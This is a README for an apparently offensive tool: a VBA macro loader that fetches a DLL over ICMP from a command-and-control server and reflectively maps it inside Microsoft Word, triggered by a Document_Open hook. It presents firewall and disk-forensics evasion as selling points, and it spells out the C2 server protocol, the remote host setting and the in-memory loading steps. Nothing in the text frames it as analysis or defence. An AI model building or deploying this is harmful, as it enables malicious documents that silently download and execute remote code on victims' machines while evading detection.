# Reflective DLL Loader — ICMP

Retrieves a DLL over ICMP echo request/reply and manually maps it in Word's process — no file touches disk.

## What's here

- `ReflectiveLoader_ICMP_Standalone.bas` — the VBA loader (paste into a standard module)
- `ThisDocument.txt` — Document_Open hook to trigger on file open

## Why ICMP

ICMP (ping) is often allowed through firewalls even when all TCP/UDP ports are blocked. The data payload within ICMP echo replies is rarely inspected. Downsides: requires a custom ICMP listener on the C2, chunk size is limited (~1KB practical max), and high ping volume may be flagged.

## Server-side

You need a custom ICMP echo responder (raw socket listener) on the C2 server. It must:

1. Listen for ICMP echo requests
2. Read the 4-byte request data as a little-endian Long:
   - `0xFFFFFFFF` = size query → respond with 4 bytes: total payload size (Long LE)
   - Any other value = byte offset → respond with up to `CHUNK_SIZE` bytes of payload starting at that offset
3. Send the data back as the ICMP echo reply payload (NOT echoing the request data)

A Python example using raw sockets or scapy works for testing.

## Config

Edit the constants at the top of the `.bas` file:

```vba
Private Const SERVER_HOST As String = "192.168.1.100"
Private Const CHUNK_SIZE As Long = 1024
Private Const ICMP_TIMEOUT As Long = 5000
```

`CHUNK_SIZE` must match the server's chunk size. Smaller chunks = more pings but more reliable through restrictive networks.

## How it works

1. `IcmpCreateFile` to get an ICMP handle
2. Send echo with request data `0xFFFFFFFF` → server replies with 4-byte total size
3. Loop: send echo with byte offset → server replies with up to 1024 bytes of payload
4. `IcmpCloseHandle`
5. Same PE mapping engine: parse headers, VirtualAlloc, map sections, apply relocations, resolve imports, call DllMain

## Protocol detail

```
Request:  [4 bytes: offset (Long LE)]
Reply:    [payload bytes at that offset, up to CHUNK_SIZE]

Special:  offset = 0xFFFFFFFF  →  reply = [4 bytes: total size (Long LE)]
```

The VBA side uses `IcmpSendEcho` from iphlpapi.dll. The reply buffer contains an `ICMP_ECHO_REPLY` structure (28 bytes on x86, 40 bytes on x64) followed by the reply data. The `Data` pointer at offset 16 in the structure points to the reply payload within the buffer.

## Note

ICMP requires no port — it operates at the IP layer. The C2 listener typically needs root/admin privileges to open a raw socket for ICMP. On Windows, `IcmpSendEcho` handles the client side without elevation.
